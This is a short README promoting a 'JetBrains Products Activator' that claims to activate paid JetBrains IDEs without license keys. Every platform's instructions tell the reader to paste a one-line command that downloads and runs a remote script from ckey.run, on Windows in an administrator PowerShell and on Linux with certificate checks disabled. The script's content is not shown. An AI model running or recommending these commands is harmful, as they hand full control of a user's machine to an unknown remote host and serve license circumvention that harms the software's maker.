# JetBrains Products Activator

Effortless activation for all JetBrains products—no license keys, no manual setup, no stress. Just copy, paste, and you're done.

---

## 🔷 For Windows

1. Press `Win + X` and select **Windows PowerShell (Administrator)**.
2. Copy and paste the following command into the terminal (⚠️ **Do not type it manually**):

```powershell
   irm ckey.run | iex
````

3. The script will automatically scan for installed JetBrains products and activate them.
   No codes. No prompts. Just wait a moment, and you're done.

### 🔍 Debug / Transparency

* To see which files were processed:

  ```powershell
  irm ckey.run/debug | iex
  ```

* To view the script's source code:

  ```powershell
  irm ckey.run
  ```

---

## 🐧 For Linux

1. Open your terminal.
2. Run the following command:

   ```bash
   wget --no-check-certificate ckey.run -O ckey.run && bash ckey.run
   ```

### 🔍 Debug

```bash
wget --no-check-certificate ckey.run/debug -O ckey.run && bash ckey.run
```

---

## 🍎 For macOS

1. Open your terminal.
2. Run using `curl` (or `wget` if installed):

   ```bash
   curl -L -o ckey.run ckey.run && bash ckey.run
   ```

### 🔍 Debug

```bash
curl -L -o ckey.run ckey.run/debug && bash ckey.run
```

---

## ✨ Indulge in the Simplicity

No license keys.
No downloads.
No stress.

✅ Just copy, paste, and activate!

